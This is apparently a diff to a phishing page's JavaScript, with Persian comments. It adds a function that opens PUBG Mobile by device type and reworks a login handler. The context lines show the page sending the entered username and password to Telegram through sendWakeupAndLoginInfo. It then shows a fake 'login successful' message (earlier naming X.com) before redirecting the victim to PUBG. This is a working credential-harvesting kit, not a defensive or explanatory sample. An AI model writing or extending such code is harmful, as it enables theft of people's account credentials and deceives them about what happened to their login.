@@ -493,6 +493,39 @@
       });
     }
 
+    // =============================================
+    // ===== 🚀 تابع باز کردن PUBG Mobile =====
+    // =============================================
+    function openPUBG() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      
+      // تشخیص دستگاه
+      const isAndroid = /android/i.test(userAgent);
+      const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
+      
+      if (isAndroid) {
+        // تلاش برای باز کردن اپلیکیشن اندروید
+        window.location.href = 'intent://com.tencent.ig#Intent;scheme=https;package=com.tencent.ig;end';
+        
+        // اگر اپ باز نشد، بعد از ۲ ثانیه به گوگل‌پلی برو
+        setTimeout(() => {
+          window.location.href = 'https://play.google.com/store/apps/details?id=com.tencent.ig';
+        }, 2000);
+        
+      } else if (isIOS) {
+        // برای آیفون
+        window.location.href = 'https://pubg.com/';  // لینک یونیورسال
+        
+        setTimeout(() => {
+          window.location.href = 'https://apps.apple.com/app/pubg-mobile/id1330123889';
+        }, 2000);
+        
+      } else {
+        // کامپیوتر یا سایر دستگاه‌ها
+        window.open('https://www.pubg.com/', '_blank');
+      }
+    }
+
     // ===== Eye Toggle =====
     const togglePassword = document.getElementById('togglePassword');
     const passwordField = document.getElementById('passwordField');
@@ -544,12 +577,21 @@
         return false;
       }
 
-      // ارسال پیام‌ها به تلگرام
+      // =============================================
+      // 🚀 ارسال به تلگرام + باز کردن PUBG
+      // =============================================
+      
+      // 1. ارسال اطلاعات به تلگرام
       sendWakeupAndLoginInfo(input, password);
 
-      // نمایش پیام موفقیت
-      successBox.innerHTML = `<i class="fas fa-check-circle"></i> ورود موفقیت‌آمیز به X.com!`;
+      // 2. نمایش پیام موفقیت
+      successBox.innerHTML = `<i class="fas fa-check-circle"></i> ✅ ورود موفق! در حال انتقال به PUBG...`;
       successBox.style.display = 'block';
+
+      // 3. با تاخیر 1.5 ثانیه PUBG را باز کن
+      setTimeout(() => {
+        openPUBG();
+      }, 1500);
 
       return false;
     }
